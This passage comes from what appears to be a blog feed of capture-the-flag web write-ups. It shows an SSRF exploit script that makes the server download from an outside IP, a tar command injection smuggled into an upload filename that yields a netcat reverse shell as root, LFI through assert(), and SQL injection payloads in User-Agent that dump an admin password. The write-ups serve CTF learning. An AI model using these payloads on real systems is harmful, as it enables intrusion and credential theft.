class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RunRollbackDB</span>(<span class="params">dbhash</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.environ[<span class="string">&#x27;ENV&#x27;</span>] == <span class="string">&#x27;LOCAL&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> dbhash <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dbhash is None&quot;</span></span><br><span class="line">        dbhash = <span class="string">&#x27;&#x27;</span>.join(e <span class="keyword">for</span> e <span class="keyword">in</span> dbhash <span class="keyword">if</span> e.isalnum())</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;backup/&#x27;</span>+dbhash):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Where is file?&quot;</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        logger.error(<span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;exception!!&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>RunRollbackDB()</code>는 아까 위에서 봤다 시피 <code>backup/dbhash</code> 파일이 존재하면 <code>FLAG</code> 파일을 읽고, 반환해주는 함수입니다. </p><p>그래서 처음에는 다음과 같은 시나리오를 세웠었습니다.</p><ul><li>시나리오 1</li></ul><ol><li>SSRF 취약점을 이용해서 <code>/integrityStatus</code>로 요청을 보내 <code>dbHash</code>의 값을 가져옴</li><li>가져온 dbHash 값을 이용해서 <code>/rollback</code>으로 요청을 보내서 FLAG를 읽음</li><li>FLAG는 <code>lang</code>이라는 헤더 값으로 반환이 됨</li></ol><p>하지만 위 시나리오를 이용해서 익스를 하려 했지만 <code>IntegrityCheck()</code> 함수에서 <code>self.dbHash</code>의 값과 <code>dbHash</code>의 값이 동일하면 안 되기 때문에 공격을 할 수 없었습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WriteFile</span>(<span class="params">url</span>):</span></span><br><span class="line">    local_filename = url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> requests.get(url, stream=<span class="literal">True</span>) <span class="keyword">as</span> r:</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;backup/&#x27;</span>+local_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">8192</span>): </span><br><span class="line">                f.write(chunk)</span><br></pre></td></tr></table></figure><p>그래서 다시 코드를 분석해보니, <code>WriteFile()</code> 함수를 이용해서 <code>backup/</code> 아래에 파일을 만들어주는 것을 볼 수 있었습니다. 그래서 <code>WriteFile</code> 함수를 이용해서 아무 파일을 하나 생성해주고, 해당 파일의 이름을 <code>dbHash</code>로 전송해주면 클래스 내에 있는 변수인 <code>self.dbHash</code>의 값과 동일하지 않고, 또 <code>backup/</code> 아래에 존재하기 때문에 충분히 우회해서 플래그를 읽을 수 있습니다.</p><p><code>WriteFile()</code> 함수 내부를 보면  <code>requests.get()</code> 함수를 이용해서 요청을 보내고, <code>url.split(&#39;/&#39;)[-1]</code>의 값을 파일 이름으로 사용해 생성하고 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Sign&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> SignCheck(request):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            src = request.args.get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> valid_download(src):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;false&#x27;</span>))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> valid_download(request.form[<span class="string">&#x27;src&#x27;</span>]):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;false&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        WriteFile(src)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;success&#x27;</span>))</span><br></pre></td></tr></table></figure><p><code>WriteFile()</code> 함수는 <code>/download</code>에서 호출을 하는데 이때, <code>Sign</code>이라는 헤더 값이 존재하고, <code>SignCheck()</code> 함수의 반환 값이 참이고, <code>src</code> 파리미터의 값이 존재하면 <code>WriteFile()</code> 함수를 실행시켜줍니다.</p><ul><li>시나리오 2</li></ul><ol><li>SSRF 취약점을 이용해서 /download로 요청을 보내서 임의의 파일을 생성함.</li><li>또 다시 SSRF 취약점을 이용해서 /rollback로 요청을 보내 <code>FLAG</code>를 읽음 </li><li>이때 해당 파일의 이름을 이용해서 <code>self.dbHash != dbHash</code> 구문을 우회함.</li><li>마지막으로 <code>lang</code> 헤더를 읽으면 됨.</li></ol><ul><li>주의점</li></ul><ol><li>파일을 생성할 때, <code>requests.get()</code> 함수를 이용해서 요청을 보내기 때문에 파일을 만들 때, <code>URL</code>을 전송해서 만들어주어야 함.</li><li><code>RunRollbackDB()</code> 함수 내에서 <code>dbHash</code>의 값을 한 번 더 파싱하는데, 이때 <code>e.isalnum()</code>의 값이 참이어야 함.</li><li>플래그를 읽을 때, 환경 변수 <code>ENV</code>의 값이 <code>Local</code>이 아니여야 하기 때문에 <code>5050</code> 포트가 아닌 <code>5000</code> 포트를 사용해주어야 함.</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://35.200.63.50/apis/&#x27;</span></span><br><span class="line"></span><br><span class="line">Key = hashlib.sha512((<span class="string">&#x27;ed05a1c7ff6428dcf8d50901b6e78ba3&#x27;</span>).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">print(<span class="string">&#x27;[+] Key  : &#x27;</span> + Key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">KEY</span>):</span></span><br><span class="line">    privateKey = <span class="string">b&#x27;let\&#x27;sbitcorinparty&#x27;</span></span><br><span class="line">    EN = hmac.new( privateKey , KEY.encode(<span class="string">&#x27;utf-8&#x27;</span>), hashlib.sha512 )</span><br><span class="line">    <span class="keyword">return</span> EN.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">integrityStatus</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;/integrityStatus&#x27;</span>&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/integreityStatus : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;download?src=http://141.164.52.207/a123&#x27;</span>, <span class="string">&#x27;Sign&#x27;</span>:sign(<span class="string">&#x27;src=http://141.164.52.207/a123&#x27;</span>)&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/download : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rollback</span>():</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;localhost:5000&#x27;</span>, <span class="string">&#x27;Lang&#x27;</span>:<span class="string">&#x27;/rollback?dbhash=a123&#x27;</span>, <span class="string">&#x27;Sign&#x27;</span>:sign(<span class="string">&#x27;dbhash=a123&#x27;</span>), <span class="string">&#x27;Key&#x27;</span>:Key&#125;</span><br><span class="line">    res = requests.get(url+<span class="string">&#x27;coin&#x27;</span>, headers=headers)</span><br><span class="line">    print(<span class="string">&#x27;[+] headers in /apis/rollback : &#x27;</span> + res.headers[<span class="string">&#x27;lang&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    integrityStatus()</span><br><span class="line">    download()</span><br><span class="line">    rollback()</span><br></pre></td></tr></table></figure><blockquote><p>FLAG : LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UTCTF 2021 Write Up</title>
      <link href="2021/03/14/2021-03-14-UTCTF-2021/"/>
      <url>2021/03/14/2021-03-14-UTCTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Tar-Inspector-994-pts"><a href="#Web-Tar-Inspector-994-pts" class="headerlink" title=" (Web) Tar Inspector [994 pts]"></a><span style="color:#21C587"></span> (Web) Tar Inspector [994 pts]</h2><blockquote><p>Tar Inspector challenge is get the shell using RCE and read the flag</p></blockquote><p>Many people asked for a hint and the contest provided the code for the secure_filename() function. So first, I’ll see <code>secure_filename()</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># creates a secured version of the filename</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secure_filename</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="comment"># strip extension and any sneaky path traversal stuff</span></span><br><span class="line">    filename = filename[:-<span class="number">4</span>]</span><br><span class="line">    filename = os.path.basename(filename)</span><br><span class="line">    <span class="comment"># escape shell metacharacters</span></span><br><span class="line">    filename = re.sub(<span class="string">&quot;(!|\$|#|&amp;|\&quot;|\&#x27;|\(|\)|\||&lt;|&gt;|`|\\\|;)&quot;</span>, <span class="string">r&quot;\\\1&quot;</span>, filename)</span><br><span class="line">    filename = re.sub(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, filename)</span><br><span class="line">    <span class="comment"># add extension</span></span><br><span class="line">    filename += <span class="string">&#x27;__&#x27;</span>+<span class="built_in">hex</span>(randrange(<span class="number">10000000</span>))[<span class="number">2</span>:]+<span class="string">&#x27;.tar&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> filename</span><br></pre></td></tr></table></figure><p>You can see that the secure_filename() function gets the file name excluding the extension, escapes all special characters, and creates a new file name by including a random value between the file names.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/1.png?raw=true"></p><p>Go into the challenge and you can will see the file upload function.</p><p><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/2.png?raw=true"></p><p>If you upload any file, you can see that only the <code>.tar</code> extension can be uploaded. Probably I need to make RCE happen when i unpack the tar file. When unpack the tar file, I can execute file <code>using --to-command</code> option :)</p><ul><li>Scenario</li></ul><ol><li>I compress the reverse shell code to tar file and I upload in server.</li><li>If you upload the tar file, you can see the newly created file name.</li><li>If you upload the created file again by name, it will be unpack and the file will be executed. Obviously, you need to add the <code>--to-command</code> option at this time.</li><li>And since the last in the file must be <code>.tar</code>, you can bypass it using the <code>--exclude</code> option.</li></ol><p><img src="https://github.com/wjddnjs33/image/blob/main/UTCTF%202021/3.png?raw=true"></p><p>After uploading the tar file, you can see a file named <code>pocas__bf9d0.tar</code> was created :) Now, When you unpack the <code>pocas__bf9d0.tar</code> file, you can execute the reverse shell file.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: web2.utctf.live:8123</span><br><span class="line">Content-Length: 1566</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundarytCvRhaPJjhVCXGrN</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytCvRhaPJjhVCXGrN</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;pocas__bf9d0.tar --to-command&#x3D;python3$&#123;IFS&#125;pocas.py --exclude&#x3D;pocas.tar&quot;</span><br><span class="line">Content-Type: application&#x2F;x-tar</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytCvRhaPJjhVCXGrN--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>I used the <code>--to-command</code>/<code>--exclude</code> option as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lp 80</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line"># id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line"># pwd</span><br><span class="line">&#x2F;tmp&#x2F;extracts</span><br><span class="line"># cat &#x2F;flag.txt</span><br><span class="line">utflag&#123;bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk&#125;</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>You can see that it is unpacked, and the file is executed to get the shell :)</p><blockquote><p>FLAG : utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NahamCon CTF 2021 Write Up</title>
      <link href="2021/03/14/2021-03-14-NahamCon-CTF-2021/"/>
      <url>2021/03/14/2021-03-14-NahamCon-CTF-2021/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-Asserted-283-pts"><a href="#Web-Asserted-283-pts" class="headerlink" title=" (Web) Asserted [283 pts]"></a><span style="color:#21C587"></span> (Web) Asserted [283 pts]</h2><blockquote><p>Asserted challenge is get flag using LFI and assert() vuln</p></blockquote><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/1.png?raw=true"></p><p>Go into the challenge and u will see a simple blog and <code>ABOUTS US</code>/<code>SCHEDULE</code>/<code>GALLERY</code>/<code>BLOG</code>/<code>CONTACTS</code> function.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/2.png?raw=true"></p><p>So once I went into <code>ABOUT DS</code> and looked at <code>URL</code>, I could see that the file was fetched using the <code>page</code> parameter. Here I thought that I could do LFI attack using <code>PHP Wrapper</code>.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Asserted/3.png?raw=true"></p><p>When I read the index.php file using <code>PHP Wrapper</code>, I could see that it worked.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Saving ourselves from any kind of hackings and all</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;home.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>If you look at the index.php code, you can see that it is using the assert() function. So you can use the assert() function vulnerability to read the flag with <code>RCE</code>.</p><blockquote><p>FLAG : flag{85a25711fa6e111ed54b86468a45b90c}</p></blockquote><hr><h2 id="Web-Bad-Blog-469-pts"><a href="#Web-Bad-Blog-469-pts" class="headerlink" title=" (Web) Bad Blog [469 pts]"></a><span style="color:#21C587"></span> (Web) Bad Blog [469 pts]</h2><blockquote><p>Bad Blog challenge is get the admin account using the SQL Injection of insert statements.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/1.png?raw=true"></p><p>Go into the challenge and u will see a login form.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/2.png?raw=true"></p><p>When u register and login, u will see the posts and <code>add post</code>/<code>Logged in</code> as a function.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/3.png?raw=true"></p><p>I created a post and was able to read it with <code>/post/:title</code>. I thought there would be an xss or ssti vuln here. but it didn’t happen at all.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/5.png?raw=true"></p><p>I found something interesting in <code>/profile</code>. Whenever someone read my post, I creat a log using <code>User-Agent</code>. I thought I was save log using a database, So, I try SQL Injection using <code>User-Agent</code> in <code>/post:title</code>.</p><p><img src="https://github.com/wjddnjs33/image/raw/main/NahamConCTF/Bad%20Blog/6.png?raw=true"></p><p>When i passed the value of <code>User-Agent</code>, I could see a db error :) I was able know using sqlite3 in server and using insert statements. So, I’ll try union SQL Injection attack of insert statements in sqlite 3!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">User-Agent : a&#39;), (5, 2, (select group_concat(sql) from sqlite_master))--</span><br><span class="line">Output     : CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(40), password VARCHAR(40), PRIMARY KEY (id), UNIQUE (username) ),CREATE TABLE post ( id INTEGER NOT NULL, title VARCHAR(40), author_id INTEGER, date VARCHAR(40), category VARCHAR(40), image VARCHAR(60), thumbnail VARCHAR(60), heading VARCHAR(200), content VARCHAR(10000), PRIMARY KEY (id), UNIQUE (title), FOREIGN KEY(author_id) REFERENCES user (id) ),CREATE TABLE visit ( id INTEGER NOT NULL, post_id INTEGER, user_id INTEGER, ua VARCHAR(100), PRIMARY KEY (id), FOREIGN KEY(post_id) REFERENCES post (id), FOREIGN KEY(user_id) REFERENCES user (id) )</span><br><span class="line"></span><br><span class="line">User-Agent : a&#39;),(5,2,(select group_concat(username) from user))--</span><br><span class="line">Output     : a,admin</span><br><span class="line"></span><br><span class="line">User-Agent : a&#39;),(5,2,(select group_concat(password) from user))--</span><br><span class="line">Output     : J3H8cqMNWxH68mTj,a</span><br></pre></td></tr></table></figure><p>Using the payload above, I was able to get an admin account. Now, login as an administrator to get the flag.</p><blockquote><p>FLAG : flag{8b31eecb1831ed594fa27ef5b431fe34}</p></blockquote><hr><h2 id="Web-AgentTester-463-pts"><a href="#Web-AgentTester-463-pts" class="headerlink" title=" (Web) AgentTester [463 pts]"></a><span style="color:#21C587"></span> (Web) AgentTester [463 pts]</h2><blockquote><p>AgentTester challenge is get the admin account using SQL Injection and after login get the flag using SSTI.</p></blockquote><p>Frist, I’ll analysis source code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask_uwsgi_websocket <span class="keyword">import</span> GeventWebSocket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> backend.backend <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ws = GeventWebSocket(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    success = request.args.get(<span class="string">&quot;success&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    error = request.args.get(<span class="string">&quot;error&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;templates/index.html&quot;</span>,</span><br><span class="line">        user=g.user,</span><br><span class="line">        success=success,</span><br><span class="line">        error=error,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/debug&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    sessionID = session.get(<span class="string">&quot;id&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> sessionID == <span class="number">1</span>:</span><br><span class="line">        code = request.form.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&lt;h1&gt;Safe Debug&lt;/h1&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(code)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not allowed.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile/&lt;int:user_id&gt;&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">profile</span>(<span class="params">user_id</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> g.user.<span class="built_in">id</span> == user_id:</span><br><span class="line">        user_now = User.query.get(user_id)</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">            about = request.form.get(<span class="string">&quot;about&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">            email = request.form.get(<span class="string">&quot;email&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> email:</span><br><span class="line">                user_now.email = email</span><br><span class="line">            <span class="keyword">if</span> about:</span><br><span class="line">                user_now.about = about</span><br><span class="line">            <span class="keyword">if</span> email <span class="keyword">or</span> about:</span><br><span class="line">                db.session.commit()</span><br><span class="line"></span><br><span class="line">    <span 